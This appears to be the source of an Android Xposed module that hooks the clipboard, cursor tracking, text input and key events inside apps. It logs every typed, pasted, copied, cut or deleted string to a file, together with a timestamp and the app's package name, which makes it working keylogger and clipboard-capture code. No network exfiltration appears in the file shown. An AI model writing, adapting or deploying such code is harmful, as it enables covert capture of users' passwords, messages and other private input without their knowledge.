package an.input.hook;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.view.KeyEvent;
import android.view.inputmethod.BaseInputConnection;
import android.view.inputmethod.InputConnection;
import android.widget.TextView;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import java.util.Date;

import static an.input.hook.Utils.getKeyCodeName;
import static an.input.hook.Utils.writeToFile;
import static an.input.hook.Utils.writeLogFile;

public class InputConnectionHook
{
 ClipboardHook cbh = new ClipboardHook();
 Object clipboardValue = null;
 CursorHook ch = new CursorHook();
 int cursorStartIndex = -1;
 int cursorEndIndex = -1;
 
 public void hook(LoadPackageParam p1)
 {
  
  //监控粘贴板
  XposedHelpers.findAndHookMethod(ClipboardManager.class.getName(), p1.classLoader, "setText", CharSequence.class, cbh);
  XposedHelpers.findAndHookMethod(ClipboardManager.class.getName(), p1.classLoader, "setPrimaryClip", ClipData.class, cbh);

  //监控光标位置
  XposedHelpers.findAndHookMethod(TextView.class.getName(), p1.classLoader, "onSelectionChanged", Integer.TYPE, Integer.TYPE, ch);

  BaseWordsHook bwh = new BaseWordsHook(p1);
  KeyEventHook keh = new KeyEventHook(p1);

  //基础文字输入
  XposedHelpers.findAndHookMethod(BaseInputConnection.class.getName(), p1.classLoader, "commitText", CharSequence.class, Integer.TYPE, bwh);
  XposedHelpers.findAndHookMethod(BaseInputConnection.class.getName(), p1.classLoader, "setComposingText", CharSequence.class, Integer.TYPE, bwh);

  //系统粘贴、剪切
  XposedHelpers.findAndHookMethod(TextView.class.getName(), p1.classLoader, "onTextContextMenuItem", Integer.TYPE, new TextContextMenuHook(p1));

  //XposedHelpers.findAndHookMethod("com.aide.common.KeyStrokeDetector$1", p1.classLoader, "commitText", CharSequence.class, Integer.TYPE, mha);
  //XposedHelpers.findAndHookMethod("android.view.inputmethod.InputConnectionWrapper", p1.classLoader, "setComposingText", CharSequence.class, Integer.TYPE, mha);
  XposedHelpers.findAndHookMethod(BaseInputConnection.class.getName(), p1.classLoader, "sendKeyEvent", KeyEvent.class, keh);
  //XposedHelpers.findAndHookMethod("android.view.inputmethod.InputConnectionWrapper", p1.classLoader, "sendKeyEvent", KeyEvent.class, mhb);
 }

 class BaseWordsHook extends XC_MethodHook
 {
  LoadPackageParam lpp = null;

  public BaseWordsHook(LoadPackageParam p)
  {
   lpp = p;
  }

  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   StringBuilder sb = new StringBuilder();
   sb.append(new Date().toLocaleString().split(" ")[1])
    .append(", 包:").append(lpp.packageName);
   if(HookConfig.noteClassName == 1)
    sb.append(", 类:").append(param.thisObject.getClass().getCanonicalName());
   sb.append(", 事件:添加, 位置:").append(cursorStartIndex);
   if(cursorStartIndex != cursorEndIndex)
    sb.append("~").append(cursorEndIndex);
   sb.append(", 内容:").append(param.args[0]);
   
   writeToFile(sb.toString());
  }

 }

 class KeyEventHook extends XC_MethodHook
 {
  LoadPackageParam lpp = null;

  public KeyEventHook(LoadPackageParam p)
  {
   lpp = p;
  }

  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   KeyEvent ket = (KeyEvent)param.args[0];
   if(ket.getAction() != KeyEvent.ACTION_UP)return;
   
   StringBuilder sb = new StringBuilder();
   sb.append(new Date().toLocaleString().split(" ")[1])
    .append(", 包:").append(lpp.packageName);
   if(HookConfig.noteClassName == 1)
    sb.append(", 类:").append(param.thisObject.getClass().getCanonicalName());
   sb.append(", 事件:").append(getKeyCodeName(ket.getKeyCode()));
   switch(ket.getKeyCode())
   {
    case KeyEvent.KEYCODE_DPAD_UP:
    case KeyEvent.KEYCODE_DPAD_DOWN:
    case KeyEvent.KEYCODE_DPAD_LEFT:
    case KeyEvent.KEYCODE_DPAD_RIGHT:
    case KeyEvent.KEYCODE_SHIFT_LEFT:
    case KeyEvent.KEYCODE_SHIFT_RIGHT:
    case KeyEvent.KEYCODE_TAB:
    case KeyEvent.KEYCODE_ENTER:
    case KeyEvent.KEYCODE_SPACE:
     sb.append(", 位置:").append(cursorStartIndex);
     if(cursorStartIndex != cursorEndIndex)
      sb.append("~").append(cursorEndIndex);
     break;
    case KeyEvent.KEYCODE_DEL:
     CharSequence selCharS = ((InputConnection)param.thisObject).getSelectedText(0);
     if(selCharS == null || selCharS.length() < 1)
     {
      selCharS = ((InputConnection)param.thisObject).getTextBeforeCursor(1,0);
     }
     if(selCharS == null)selCharS = "";
     sb.append(", 位置:").append(cursorStartIndex);
     if(cursorStartIndex != cursorEndIndex)
      sb.append("~").append(cursorEndIndex);
     sb.append(", 内容:").append(selCharS);
     break;
   }
   if(BuildConfig.DEBUG)
    writeLogFile("Action:"+ket.getAction()+" Key:"+getKeyCodeName(ket.getKeyCode()));
   writeToFile(sb.toString());
  }

 }

 class TextContextMenuHook extends XC_MethodHook
 {
  LoadPackageParam lpp = null;

  public TextContextMenuHook(LoadPackageParam p)
  {
   lpp = p;
  }

  protected void afterHookedMethod(MethodHookParam param) throws Throwable
  {
   if(BuildConfig.DEBUG)
    writeLogFile("触发系统复制、粘贴、剪切、全选，剪贴板内容="+clipboardValue);
   String operation = Utils.KEYCODE_NAME[0];
   String value = clipboardValue.toString();
   switch((int)param.args[0])
   {
    case android.R.id.selectAll:
     operation = "全选";
     value = ((TextView)param.thisObject).getText()
      .subSequence(cursorStartIndex, cursorEndIndex).toString();
     break;
    case android.R.id.copy:
     operation = getKeyCodeName(KeyEvent.KEYCODE_COPY);
     cursorStartIndex -= clipboardValue.toString().length();
     break;
    case android.R.id.paste:
     operation = getKeyCodeName(KeyEvent.KEYCODE_PASTE);
     cursorStartIndex -= clipboardValue.toString().length();
     break;
    case android.R.id.cut:
     operation = getKeyCodeName(KeyEvent.KEYCODE_CUT);
     cursorEndIndex += clipboardValue.toString().length();
     break;
   }
   StringBuilder sb = new StringBuilder();
   sb.append(new Date().toLocaleString().split(" ")[1])
    .append(", 包:").append(lpp.packageName);
   if(HookConfig.noteClassName == 1)
    sb.append(", 类:").append(param.thisObject.getClass().getCanonicalName());
   sb.append(", 事件:").append(operation)
    .append(", 位置:").append(cursorStartIndex);
   if(cursorStartIndex != cursorEndIndex)
    sb.append("~").append(cursorEndIndex);
   sb.append(", 内容:").append(value);
   writeToFile(sb.toString());
  }

 }

 class ClipboardHook extends XC_MethodHook
 {
  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   if(param.args[0] instanceof ClipData)
   {
    ClipData cd = (ClipData)param.args[0];
    clipboardValue = cd.getItemAt(0).getText();
   }else
    clipboardValue = param.args[0];
   if(BuildConfig.DEBUG)
    writeLogFile("复制内容="+param.args[0]);
  }
 }

 class CursorHook extends XC_MethodHook
 {
  protected void beforeHookedMethod(MethodHookParam param) throws Throwable
  {
   cursorStartIndex = param.args[0];
   cursorEndIndex = param.args[1];
   if(BuildConfig.DEBUG)
    writeLogFile("光标位置="+cursorStartIndex+"~"+cursorEndIndex);
  }
 }
 
 
}
